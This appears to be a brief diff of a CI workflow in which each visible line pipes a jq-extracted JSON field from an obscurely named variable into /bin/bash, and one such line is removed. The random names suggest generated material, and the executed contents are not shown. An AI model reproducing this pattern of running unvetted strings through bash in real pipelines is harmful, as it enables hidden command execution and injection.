@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$dnwa506" | jq -r .aufs2142 | /bin/bash
           echo $ja945 | jq -r .mp48 | /bin/bash
           printf '%s' "$grpiw51677" | jq -r .ngh908 | /bin/bash
-          echo $wbm01469 | jq -r .koq117 | /bin/bash
           echo $davi92 | jq -r .sw192 | /bin/bash
           echo $yf0461 | jq -r .zisxi530 | /bin/bash
           printf '%s' "$uzbtw767" | jq -r .ktkld45820 | /bin/bash
